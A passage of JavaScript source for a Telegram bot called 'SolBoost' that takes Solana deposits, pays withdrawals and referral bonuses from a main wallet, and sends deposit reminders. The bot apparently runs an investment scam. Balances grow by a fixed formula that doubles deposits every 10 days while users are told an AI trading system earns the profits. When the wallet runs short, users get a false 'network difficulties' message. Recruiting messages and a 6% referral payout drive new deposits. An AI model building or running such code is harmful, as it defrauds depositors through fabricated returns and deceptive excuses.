  } catch (error) {
    console.error('Error in manual withdrawal:', error);
    await ctx.answerCbQuery('An error occurred. Please try again.');
  }
});



bot.action(/^withdraw_profit_/, async (ctx) => {
  console.log('Callback data:', ctx.match);
  const chatId = ctx.from.id;
  const profit = parseFloat(ctx.match.input.split('_')[2]);
  console.log('Extracted profit:', profit);
  
  if (isNaN(profit) || profit < 0.1) {
    await ctx.answerCbQuery('Invalid or insufficient withdrawal amount. Minimum is 0.1 SOL');
    return;
  }

  try {
    // Check main wallet balance first
    const mainWalletBalance = await checkMainWalletBalance();
    if (mainWalletBalance < profit) {
      await ctx.answerCbQuery('We are facing technical difficulties in Solana network, Please try again later.');
      // Notify admin
      await bot.telegram.sendMessage(BOT_OWNER_ID, `LOW BALANCE ALERT: Main wallet balance (${mainWalletBalance} SOL) is less than requested withdrawal (${profit} SOL).`);
      return;
    }

    const result = await pool.query('SELECT public_key FROM users WHERE chat_id = $1', [chatId]);
    if (result.rows.length === 0) {
      await ctx.answerCbQuery('User not found. Please use /start to register.');
      return;
    }
    const userPublicKey = result.rows[0].public_key;
    await processWithdrawalBackground(chatId, profit);
    await ctx.answerCbQuery('Withdrawal processed successfully');
    await ctx.editMessageText(`Withdrawal of ${profit.toFixed(2)} SOL has been processed.`);
  } catch (error) {
    console.error('Error processing manual withdrawal:', error);
    await ctx.answerCbQuery('An error occurred during withdrawal. Please try again or contact support.');
    await ctx.editMessageText('An error occurred during withdrawal. Please try again or contact support.');
  }
});


async function processWithdrawalBackground(chatId, amount) {
  try {
    // Check main wallet balance first
    const mainWalletBalance = await checkMainWalletBalance();
    console.log(`Main wallet balance: ${mainWalletBalance} SOL`);

    if (mainWalletBalance < amount) {
      console.log(`Insufficient main wallet balance for withdrawal of ${amount} SOL`);
      await bot.telegram.sendMessage(chatId, 'We are facing technical difficulties. Please try again later.');
      // Notify admin
      await bot.telegram.sendMessage(BOT_OWNER_ID, `LOW BALANCE ALERT: Main wallet balance (${mainWalletBalance} SOL) is less than requested withdrawal (${amount} SOL).`);
      return;
    }

    const result = await pool.query('SELECT public_key FROM users WHERE chat_id = $1', [chatId]);
    if (result.rows.length === 0) {
      console.log(`User ${chatId} not found in database`);
      await bot.telegram.sendMessage(chatId, 'User not found. Please use /start to register.');
      return;
    }
    const userPublicKey = result.rows[0].public_key;

    console.log(`Processing withdrawal for user ${chatId} with public key ${userPublicKey}`);
    const newBalance = await processWithdrawal(chatId, amount, userPublicKey);
    console.log(`Withdrawal of ${amount} SOL processed successfully for user ${chatId}. New balance: ${newBalance} SOL`);
    
    await bot.telegram.sendMessage(chatId, `Withdrawal of ${amount.toFixed(2)} SOL has been processed successfully. Your new balance is ${newBalance.toFixed(2)} SOL.`);
  } catch (error) {
    console.error('Error processing manual withdrawal:', error);
    if (error.message.includes('Another withdrawal is in progress')) {
      await bot.telegram.sendMessage(chatId, 'Another withdrawal is currently in progress. Please try again in a few minutes.');
    } else {
      await bot.telegram.sendMessage(chatId, 'An error occurred during withdrawal. Please try again or contact support.');
      // Notify admin about the error
      const adminMessage = `Error processing withdrawal for user ${chatId}: ${error.message}`;
      await bot.telegram.sendMessage(BOT_OWNER_ID, adminMessage);
    }
  }
}


bot.action('auto_reinvest', async (ctx) => {
  const chatId = ctx.from.id;
  try {
    const result = await pool.query(
      'UPDATE users SET auto_reinvest = NOT auto_reinvest WHERE chat_id = $1 RETURNING auto_reinvest',
      [chatId]
    );
    const autoReinvest = result.rows[0].auto_reinvest;
    
    let message;
    let keyboard;

    if (autoReinvest) {
      message = 'Auto reinvest is now enabled. Profits will be automatically added to your main balance.';
      keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('Disable Auto Reinvest', 'auto_reinvest')],
        [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
      ]);
    } else {
      message = 'Auto reinvest is now disabled. Would you like to withdraw your profits?';
      keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('Withdraw Profits', 'manual_withdrawal')],
        [Markup.button.callback('Enable Auto Reinvest', 'auto_reinvest')],
        [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
      ]);
    }

    await ctx.answerCbQuery(`Auto reinvest turned ${autoReinvest ? 'ON' : 'OFF'}`);
    await ctx.editMessageText(message, keyboard);
  } catch (error) {
    console.error('Error toggling auto reinvest:', error);
    await ctx.answerCbQuery('An error occurred. Please try again.');
  }
});

// Function to process auto invest
const processAutoReinvest = async () => {
  const client = await pool.connect();
  try {
    console.log('Starting auto-reinvest process...');
    const query = `
      SELECT chat_id, deposit_amount, last_profit_check
      FROM users
      WHERE auto_reinvest = true
    `;
    const result = await client.query(query);
    console.log(`Found ${result.rows.length} users with auto-reinvest enabled.`);

    for (const user of result.rows) {
      const currentBalance = calculateBalance(parseFloat(user.deposit_amount), new Date(user.last_profit_check));
      const profit = currentBalance - parseFloat(user.deposit_amount);

      if (profit > 0) {
        await client.query(
          'UPDATE users SET deposit_amount = $1, last_profit_check = CURRENT_TIMESTAMP WHERE chat_id = $2',
          [currentBalance, user.chat_id]
        );
        console.log(`Auto reinvest for user ${user.chat_id}: ${profit.toFixed(2)} SOL profit reinvested.`);
        await bot.telegram.sendMessage(user.chat_id, `Auto reinvest: ${profit.toFixed(2)} SOL profit has been added to your main balance.`);
      } else {
        console.log(`No profit to reinvest for user ${user.chat_id}`);
      }
    }
    console.log('Auto-reinvest process completed.');
  } catch (error) {
    console.error('Error processing auto reinvest:', error);
  } finally {
    client.release();
  }
};
// Run auto invest process every day
setInterval(processAutoReinvest, 60 * 60 * 1000);


bot.action('withdrawal_history', async (ctx) => {
  const chatId = ctx.from.id;
  try {
    const query = `
      SELECT amount::numeric, transaction_date, status
      FROM transactions
      WHERE user_id = $1 AND transaction_type = 'withdrawal'
      ORDER BY transaction_date DESC
      LIMIT 10;
    `;
    const result = await pool.query(query, [chatId]);

    if (result.rows.length > 0) {
      let message = 'Your recent withdrawal history:\n\n';
      result.rows.forEach((row, index) => {
        const amount = parseFloat(row.amount);
        message += `${index + 1}. Amount: ${amount.toFixed(2)} SOL\n`;
        message += `   Date: ${new Date(row.transaction_date).toLocaleString()}\n`;
        message += `   Status: ${row.status}\n\n`;
      });

      await ctx.editMessageText(message, {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('Back to Withdraw Options', 'back_to_withdraw')]
        ])
      });
    } else {
      await ctx.editMessageText('You have no withdrawal history yet.', {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('Back to Withdraw Options', 'back_to_withdraw')]
        ])
      });
    }
  } catch (error) {
    console.error('Error fetching withdrawal history:', error);
    await ctx.answerCbQuery('An error occurred while fetching your withdrawal history.');
    await ctx.editMessageText('An error occurred. Please try again later.', {
      parse_mode: 'HTML',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('Back to Withdraw Options', 'back_to_withdraw')]
      ])
    });
  }
});



const recordWithdrawal = async (userId, amount, txSignature) => {
  const client = await pool.connect();
  try {
    const query = `
      INSERT INTO transactions (user_id, transaction_type, amount, status, tx_signature)
      VALUES ($1, 'withdrawal', $2, 'completed', $3)
    `;
    await client.query(query, [userId, amount, txSignature]);
  } catch (error) {
    console.error('Error recording withdrawal:', error);
    throw error;
  } finally {
    client.release();
  }
};

bot.action('back_to_withdraw', async (ctx) => {
    await safeAnswerCallbackQuery(ctx);
  const withdrawKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('Auto Withdrawal', 'auto_withdrawal')],
    [Markup.button.callback('Manual Withdrawal', 'manual_withdrawal')],
    [Markup.button.callback('Auto Reinvest', 'auto_reinvest')],
    [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
  ]);

  await safeEditMessage(ctx, 'Choose a withdrawal option:', withdrawKeyboard);
});


const clearBalanceInterval = (ctx) => {
  if (ctx.session && ctx.session.balanceIntervalId) {
    clearInterval(ctx.session.balanceIntervalId);
    delete ctx.session.balanceIntervalId;
  }
};

const getAdminStats = async () => {
  const client = await pool.connect();
  try {
    const stats = {
      totalUsers: 0,
      activeUsers: 0,
      totalDeposits: 0,
      totalDepositAmount: 0,
      totalWithdrawals: 0,
      totalWithdrawalAmount: 0,
      usersWithIssues: 0,
      autoReinvestUsers: 0,
      autoWithdrawalUsers: 0,
      usersByStage: {},
    };

    // Total users and active users
    const userQuery = `
      SELECT COUNT(*) as total,
             SUM(CASE WHEN last_activity > NOW() - INTERVAL '7 days' THEN 1 ELSE 0 END) as active,
             SUM(CASE WHEN auto_reinvest THEN 1 ELSE 0 END) as auto_reinvest,
             SUM(CASE WHEN auto_withdrawal THEN 1 ELSE 0 END) as auto_withdrawal
      FROM users;
    `;
    const userResult = await client.query(userQuery);
    stats.totalUsers = parseInt(userResult.rows[0].total);
    stats.activeUsers = parseInt(userResult.rows[0].active);
    stats.autoReinvestUsers = parseInt(userResult.rows[0].auto_reinvest);
    stats.autoWithdrawalUsers = parseInt(userResult.rows[0].auto_withdrawal);

    // Deposits and withdrawals
    const transactionQuery = `
      SELECT
        SUM(CASE WHEN transaction_type = 'deposit' THEN 1 ELSE 0 END) as total_deposits,
        SUM(CASE WHEN transaction_type = 'deposit' THEN amount ELSE 0 END) as total_deposit_amount,
        SUM(CASE WHEN transaction_type = 'withdrawal' THEN 1 ELSE 0 END) as total_withdrawals,
        SUM(CASE WHEN transaction_type = 'withdrawal' THEN amount ELSE 0 END) as total_withdrawal_amount
      FROM transactions;
    `;
    const transactionResult = await client.query(transactionQuery);
    stats.totalDeposits = parseInt(transactionResult.rows[0].total_deposits);
    stats.totalDepositAmount = parseFloat(transactionResult.rows[0].total_deposit_amount);
    stats.totalWithdrawals = parseInt(transactionResult.rows[0].total_withdrawals);
    stats.totalWithdrawalAmount = parseFloat(transactionResult.rows[0].total_withdrawal_amount);

    // Users by stage
    const stageQuery = `
      SELECT
        CASE
          WHEN deposit_amount > 0 THEN 'active'
          WHEN public_key IS NOT NULL THEN 'registered'
          ELSE 'new'
        END as stage,
        COUNT(*) as count
      FROM users
      GROUP BY stage;
    `;
    const stageResult = await client.query(stageQuery);
    stageResult.rows.forEach(row => {
      stats.usersByStage[row.stage] = parseInt(row.count);
    });

    // Users with potential issues
    const issuesQuery = `
      SELECT COUNT(DISTINCT user_id) as users_with_issues
      FROM transactions
      WHERE status = 'failed' AND transaction_date > NOW() - INTERVAL '7 days';
    `;
    const issuesResult = await client.query(issuesQuery);
    stats.usersWithIssues = parseInt(issuesResult.rows[0].users_with_issues);

    return stats;
  } catch (error) {
    console.error('Error fetching admin stats:', error);
    throw error;
  } finally {
    client.release();
  }
};

// Auto reinvest function
const autoReinvest = async () => {
  try {
    const query = 'SELECT chat_id, withdrawal_amount FROM users WHERE auto_reinvest = true AND withdrawal_amount >= 0.1';
    const result = await pool.query(query);

    for (const row of result.rows) {
      const { chat_id, withdrawal_amount } = row;
      await pool.query('UPDATE users SET deposit_amount = deposit_amount + $1, withdrawal_amount = 0 WHERE chat_id = $2', [withdrawal_amount, chat_id]);
      await recordTransaction(chat_id, 'reinvest', withdrawal_amount);
      console.log(`Auto reinvested ${withdrawal_amount} SOL for user ${chat_id}`);
    }
  } catch (error) {
    console.error('Error in auto reinvest:', error);
  }
};

// Generate a unique referral link
const generateReferralLink = (userId) => {
  const botUsername = bot.botInfo.username;
  return `https://t.me/${botUsername}?start=ref${userId}`;
};

// Record a referral
const recordReferral = async (referredUserId, referrerId) => {
  const client = await pool.connect();
  try {
    const query = `
      UPDATE users
      SET referred_by = $1
      WHERE chat_id = $2 AND referred_by IS NULL
    `;
    await client.query(query, [referrerId, referredUserId]);
  } catch (error) {
    console.error('Error recording referral:', error);
    throw error;
  } finally {
    client.release();
  }
};

// Process referral bonus
const processReferralBonus = async (depositAmount, userId) => {
  const client = await pool.connect();
  try {
    // Get the referrer
    const referrerQuery = 'SELECT referred_by FROM users WHERE chat_id = $1';
    const referrerResult = await client.query(referrerQuery, [userId]);
    
    if (referrerResult.rows.length > 0 && referrerResult.rows[0].referred_by) {
      const referrerId = referrerResult.rows[0].referred_by;
      const bonusAmount = depositAmount * 0.06; // 6% of deposit

      // Transfer bonus from main wallet to referrer
      const connection = new Connection(RPC_URL);
      const referrerPublicKey = await getUserPublicKey(referrerId);
      
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: mainWallet.publicKey,
          toPubkey: new PublicKey(referrerPublicKey),
          lamports: bonusAmount * LAMPORTS_PER_SOL,
        })
      );
        const signature = await sendAndConfirmTransaction(connection, transaction, [mainWallet]);

              // Record the bonus transaction
              await recordTransaction(referrerId, 'referral_bonus', bonusAmount, signature);

              // Notify the referrer
              await bot.telegram.sendMessage(referrerId, `You've received a referral bonus of ${bonusAmount.toFixed(2)} SOL!`);
            }
          } catch (error) {
            console.error('Error processing referral bonus:', error);
            throw error;
          } finally {
            client.release();
          }
        };

bot.hears('Refresh', async (ctx) => {
  const chatId = ctx.from.id;
  try {
    // Fetch user data from the database
    const userQuery = 'SELECT public_key, deposit_amount FROM users WHERE chat_id = $1';
    const userResult = await pool.query(userQuery, [chatId]);

    if (userResult.rows.length === 0) {
      await ctx.reply('User not found. Please use /start to register.');
      return;
    }

    const { public_key, deposit_amount } = userResult.rows[0];

    // Connect to Solana and get the current balance
    const connection = new Connection(RPC_URL);
    const publicKey = new PublicKey(public_key);
    const balance = await connection.getBalance(publicKey);
    const solBalance = balance / LAMPORTS_PER_SOL;

    // Calculate profit
   // const profit = solBalance - parseFloat(deposit_amount);

    // Prepare the message
    const message = `
🔄 Refresh Complete

💼 Wallet Address:
<code>${public_key}</code>

💰 Current Balance: ${solBalance.toFixed(4)} SOL
📊 Initial Deposit: ${parseFloat(deposit_amount).toFixed(4)} SOL

Last updated: ${new Date().toLocaleString()}
    `;

    // Send the message
    await ctx.reply(message, {
      parse_mode: 'HTML',
      ...Markup.keyboard([
        ['Main Wallet', 'Start Earning'],
        ['Deposit', 'Withdraw'],
        ['Referrals', 'Balance'],
        ['Docs', 'Refresh'],
        ['💡 How it works']
      ]).resize()
    });

    // Update the deposit_amount in the database if it has changed
    //if (solBalance !== parseFloat(deposit_amount)) {
     // const updateQuery = 'UPDATE users SET deposit_amount = $1 WHERE chat_id = $2';
    //  await pool.query(updateQuery, [solBalance, chatId]);
   // }

  } catch (error) {
    console.error('Error in Refresh action:', error);
    await ctx.reply('An error occurred while refreshing your wallet information. Please try again later.');
  }
});



// Helper function to get user's public key
const getUserPublicKey = async (userId) => {
  const client = await pool.connect();
  try {
    const query = 'SELECT public_key FROM users WHERE chat_id = $1';
    const result = await client.query(query, [userId]);
    return result.rows[0].public_key;
  } catch (error) {
    console.error('Error getting user public key:', error);
    throw error;
  } finally {
    client.release();
  }
};

const sendReminders = async () => {
  const client = await pool.connect();
  try {
    console.log('Starting to send reminders to users without deposits...');

    // Query to get users who haven't made a deposit
    const query = `
      SELECT chat_id, first_name, public_key
      FROM users
      WHERE deposit_amount IS NULL OR deposit_amount = 0
    `;
    const result = await client.query(query);

    console.log(`Found ${result.rows.length} users without deposits.`);

    // Send reminder to each user
    for (const user of result.rows) {
      try {
        const userName = user.first_name || 'there';
        const userWalletAddress = user.public_key;

        const reminderMessage = `
<b>Reminder:</b>\n\n
👋 Hello, <b>${userName}</b>!\n\n
🚀 <b>🚀 Kickstart Your Earnings Today! Just type /start to begin!</b>\n\n
You haven't deposited any funds yet. 🌟 Deposit at least <b>0.5 SOL</b> now and let our automated trading system start working to grow your investment!\n\n
💸 <b>Your journey to profits begins with a simple deposit.</b> Act now and start growing your investment!\n\n
<b>Your wallet address:</b> <code>${userWalletAddress}</code>
`;

        await bot.telegram.sendMessage(user.chat_id, reminderMessage, {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: 'Deposit Now', callback_data: 'deposit_now' }],
              [{ text: 'Learn More', callback_data: 'learn_more' }]
            ]
          }
        });

        console.log(`Reminder sent to user ${user.chat_id}`);
      } catch (error) {
        console.error(`Failed to send reminder to user ${user.chat_id}:`, error);
      }
    }

    console.log('Finished sending reminders.');
  } catch (error) {
    console.error('Error in sendReminders:', error);
  } finally {
    client.release();
  }
};

const scheduleReminders = () => {
  // Send reminders every 6 hours
  const rule = new schedule.RecurrenceRule();
  rule.minute = 0; // At the beginning of the hour
  rule.hour = new schedule.Range(0, 23, 6); // Every 6 hours starting from midnight (00:00, 06:00, 12:00, 18:00)

  schedule.scheduleJob(rule, sendReminders);
  console.log('Reminders scheduled to run every 6 hours');
};


// Call this function when your bot starts
scheduleReminders();

// Add handlers for the inline keyboard buttons
bot.action('deposit_now', async (ctx) => {
    await safeAnswerCallbackQuery(ctx);
  // Implement your deposit logic here
  await ctx.reply('Great! Let\'s start your deposit process. Please follow these steps...');
});

bot.action('learn_more', async (ctx) => {
    await safeAnswerCallbackQuery(ctx);
  await ctx.reply('Here\'s more information about our automated trading system and how it can help grow your investment...');
});

// Add a command to manually trigger reminders (for testing)
bot.command('sendreminders', async (ctx) => {
  if (isBotOwner(ctx.from.id)) {
    await ctx.reply('Manually triggering reminders...');
    await sendReminders();
    await ctx.reply('Reminders sent.');
  } else {
    await ctx.reply('This command is only available to the bot owner.');
  }
});

// Function to check and process auto withdrawals
const checkAndProcessAutoWithdrawals = async () => {
  const client = await pool.connect();
  try {
    const query = `
      SELECT u.chat_id, u.public_key, u.deposit_amount, u.last_profit_check
      FROM users u
      WHERE u.auto_withdrawal = true
    `;
    const result = await client.query(query);

    for (const user of result.rows) {
      const currentBalance = calculateBalance(user.deposit_amount, user.last_profit_check);
      const profit = currentBalance - user.deposit_amount;

      if (profit >= 0.1) {
        await processWithdrawal(user.chat_id, profit, user.public_key);
        await client.query(
          'UPDATE users SET last_profit_check = CURRENT_TIMESTAMP WHERE chat_id = $1',
          [user.chat_id]
        );
      }
    }
  } catch (error) {
    console.error('Error processing auto withdrawals:', error);
  } finally {
    client.release();
  }
};

const calculateCurrentBalance = (initialAmount, depositDate) => {
  const now = new Date();
  const depositTime = new Date(depositDate);
  const elapsedDays = (now - depositTime) / (1000 * 60 * 60 * 24);
  const doublingPeriods = Math.floor(elapsedDays / 10);
  const remainingDays = elapsedDays % 10;
  
  // Calculate the balance after the full doubling periods
  let balance = initialAmount * Math.pow(2, doublingPeriods);
  
  // Apply exponential growth for the remaining days
  const partialGrowthFactor = Math.pow(2, remainingDays / 10);
  balance *= partialGrowthFactor;

  return balance;
};

// Function to process withdrawal

const processWithdrawal = async (chatId, amount, userPublicKey) => {
  const client = await pool.connect();
  try {
    await client.query('BEGIN');

    // Get user's current balance and deposit info
    const userQuery = 'SELECT deposit_amount, current_balance FROM users WHERE chat_id = $1 FOR UPDATE';
    const userResult = await client.query(userQuery, [chatId]);
    const { deposit_amount, current_balance } = userResult.rows[0];

    if (current_balance < amount) {
      throw new Error(`Insufficient user balance. Available: ${current_balance}, Requested: ${amount}`);
    }

    const connection = new Connection(RPC_URL);

    // Perform the actual transfer
    const lamports = Math.floor(amount * LAMPORTS_PER_SOL);
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: mainWallet.publicKey,
        toPubkey: new PublicKey(userPublicKey),
        lamports: lamports,
      })
    );

    const signature = await sendAndConfirmTransaction(connection, transaction, [mainWallet]);
    console.log(`Transaction sent. Signature: ${signature}`);

    // Update user's balance to match deposit amount after withdrawal
    const updateUserQuery = `
      UPDATE users
      SET current_balance = deposit_amount
      WHERE chat_id = $1
    `;
    await client.query(updateUserQuery, [chatId]);

    // Record the transaction
    await recordTransaction(chatId, 'withdrawal', amount, signature, deposit_amount);

    await client.query('COMMIT');

    console.log(`Withdrawal processed successfully for user ${chatId}. New balance set to deposit amount: ${deposit_amount} SOL`);
    return deposit_amount;
  } catch (error) {
    await client.query('ROLLBACK');
    console.error('Error processing withdrawal:', error);
    throw error;
  } finally {
    client.release();
  }
};

const checkMainWalletBalance = async () => {
  try {
    const connection = new Connection(RPC_URL);
    const balance = await connection.getBalance(mainWallet.publicKey);
    const solBalance = balance / LAMPORTS_PER_SOL;
    console.log(`Current main wallet balance: ${solBalance} SOL`);
    return solBalance;
  } catch (error) {
    console.error('Error checking main wallet balance:', error);
    throw error;
  }
};


const updateAllUserBalances = async () => {
  const client = await pool.connect();
  try {
    const query = 'SELECT chat_id, deposit_amount, deposit_date FROM users WHERE deposit_amount > 0';
    const result = await client.query(query);

    for (const user of result.rows) {
      const currentBalance = calculateCurrentBalance(user.deposit_amount, user.deposit_date);
      await client.query('UPDATE users SET current_balance = $1 WHERE chat_id = $2', [currentBalance, user.chat_id]);
    }

    console.log('All user balances updated successfully');
  } catch (error) {
    console.error('Error updating user balances:', error);
  } finally {
    client.release();
  }
};

// Run this job every 5 mins
setInterval(updateAllUserBalances, 5 * 60 * 1000);



// Run auto withdrawal check every hour
setInterval(checkAndProcessAutoWithdrawals, 60 * 60 * 1000);

// Toggle auto withdrawal
bot.action('toggle_auto_withdrawal', async (ctx) => {
  const chatId = ctx.from.id;
  try {
    const result = await pool.query(
      'UPDATE users SET auto_withdrawal = NOT auto_withdrawal WHERE chat_id = $1 RETURNING auto_withdrawal',
      [chatId]
    );
    const autoWithdrawal = result.rows[0].auto_withdrawal;
    await ctx.answerCbQuery(`Auto withdrawal turned ${autoWithdrawal ? 'ON' : 'OFF'}`);
    await ctx.editMessageText(`Auto withdrawal is now ${autoWithdrawal ? 'enabled' : 'disabled'}.`);
  } catch (error) {
    console.error('Error toggling auto withdrawal:', error);
    await ctx.answerCbQuery('An error occurred. Please try again.');
  }
});

bot.hears('Docs', async (ctx) => {
  const docsMessage = `
📚 <b>SolBoost Documentation and Links</b>

Join our community and stay updated:

🔗 <b>Telegram Group:</b>
<a href="https://t.me/solboostapp">Join SolBoost Group</a>

📢 <b>Telegram Channel:</b>
<a href="https://t.me/solboostapp">Subscribe to SolBoost Channel</a>

📝 <b>Medium Articles:</b>
<a href="https://medium.com/@solboost">Read SolBoost on Medium</a>

🐦 <b>X.com (Twitter):</b>
<a href="https://x.com/solboost_app">Follow SolBoost on X</a>

For more information and updates, please visit these links.
`;

  const inlineKeyboard = Markup.inlineKeyboard([
    [Markup.button.url('Telegram Group', 'https://t.me/solboostapp')],
    [Markup.button.url('Telegram Channel', 'https://t.me/solboostapp')],
    [Markup.button.url('Medium Articles', 'https://medium.com/@solboost')],
    [Markup.button.url('X.com (Twitter)', 'https://x.com/solboost_app')],
    [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
  ]);

  await ctx.reply(docsMessage, {
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...inlineKeyboard
  });
});



bot.hears('💡 How it works', async (ctx) => {
  const howItWorksMessage = `
<b>💡 How SolBoost Trading System Works</b>

Welcome to SolBoost! Here's a step-by-step explanation of our automated trading system:

1️⃣ <b>Deposit:</b> You start by depositing SOL into your SolBoost wallet. The minimum deposit is 0.5 SOL.

2️⃣ <b>Pooling:</b> Your funds are pooled with other users' deposits, increasing the trading power.

3️⃣ <b>Algorithm:</b> Our advanced AI-driven algorithm analyzes market trends, volatility, and multiple indicators in real-time.

4️⃣ <b>Trading:</b> Based on the analysis, the system executes trades automatically, aiming to maximize profits while minimizing risks.

5️⃣ <b>Profit Distribution:</b> Profits are distributed proportionally to all users based on their deposit amount.

6️⃣ <b>Compounding:</b> By default, profits are reinvested to leverage compound growth. You can opt for automatic withdrawals instead.

7️⃣ <b>Transparency:</b> All transactions are recorded on the Solana blockchain, ensuring full transparency and security.

8️⃣ <b>Withdrawal:</b> You can withdraw your funds (initial deposit + profits) at any time, subject to a minimum withdrawal amount.

🔐 <b>Security:</b> We employ state-of-the-art security measures to protect your funds and data.

📊 <b>Performance:</b> Our system aims for consistent returns, but please note that all trading involves risks.

For more detailed information, please check our documentation or join our Telegram group.
`;

  const inlineKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('View Docs', 'view_docs')],
    [Markup.button.callback('Join Telegram Group', 'join_telegram')],
    [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
  ]);

  await ctx.reply(howItWorksMessage, {
    parse_mode: 'HTML',
    ...inlineKeyboard
  });
});

// Handler for 'View Docs' button
bot.action('view_docs', async (ctx) => {
    await safeAnswerCallbackQuery(ctx);
  // You can either redirect to the 'Docs' menu option or provide a direct link
  await ctx.reply('You can find our detailed documentation here: [Your Docs URL]');
});

// Handler for 'Join Telegram' button
bot.action('join_telegram', async (ctx) => {
    await safeAnswerCallbackQuery(ctx);
  await ctx.reply('Join our Telegram group for discussions and updates: [Your Telegram Group URL]');
});

// Ensure you have the 'back_to_main_menu' handler as previously defined
bot.action('back_to_main_menu', async (ctx) => {
    await safeAnswerCallbackQuery(ctx);
  await sendMainMenu(ctx);
});
        
        





// Set up auto reinvest to run every 4 hours
setInterval(autoReinvest, 4 * 60 * 60 * 1000);

// Create a server for local testing
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('This is a bot application, no web interface available.\n');
}).listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});

// Launch the bot
bot.launch().then(() => {
  console.log('Bot is running...');
}).catch((err) => {
  if (err.description && err.description.includes('query is too old')) {
    console.log('Ignoring expired callback query at startup');
    // Attempt to launch the bot again
    return bot.launch();
  } else {
    console.error('Failed to start the bot:', err);
  }
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
